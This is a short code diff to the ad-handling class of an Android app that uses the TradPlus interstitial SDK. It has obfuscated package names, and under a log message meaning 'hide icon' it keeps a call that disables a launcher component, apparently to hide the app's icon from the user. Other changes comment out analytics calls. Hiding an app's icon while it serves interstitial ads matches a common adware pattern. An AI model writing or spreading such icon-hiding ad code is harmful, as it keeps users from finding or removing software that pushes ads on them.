@@ -18,7 +18,6 @@ import com.ling.ding.sighed.txtmain.FirstRunFun
 import com.ling.ding.sighed.txtmain.FirstRunFun.localStorage
 import com.ling.ding.sighed.txtmain.FirstRunFun.mainStart
 import com.ling.ding.sighed.txtmain.IntetNetSHow
-import com.ling.ding.sighed.zmain.TWMain
 import com.tradplus.ads.base.bean.TPAdError
 import com.tradplus.ads.base.bean.TPAdInfo
 import com.tradplus.ads.open.interstitial.InterstitialAdListener
@@ -125,7 +124,7 @@ class TranplusUtils {
                 }
                 ShowDataTool.showLog("隐藏图标")
 //                TWMain.dliGuso(5122)
-                TWMain.disableComponent(mainStart,"com.sophisticated.person.under.sun.ui.show.qqqqddd.Kkkpp")
+                FirstRunFun.disableComponent(mainStart,"com.sophisticated.person.under.sun.ui.show.qqqqddd.Kkkpp")
                 break
             }
 
@@ -203,7 +202,7 @@ class TranplusUtils {
                 adLimiter.recordShow()
                 resetAdStatus()
                 adInfo.let { TtPoint.postAdData(it) }
-                AppPointData.showSuccessPoint()
+//                AppPointData.showSuccessPoint()
                 isAdDataAvailable = false
             }
 
@@ -394,7 +393,7 @@ class TranplusUtils {
             incrementAdFailureCount()
 //            TWMain.dliGuso(20388)
             // 发送广告开始事件
-            TtPoint.postPointData(false, "callstart")
+//            TtPoint.postPointData(false, "callstart")
         }
     }
 
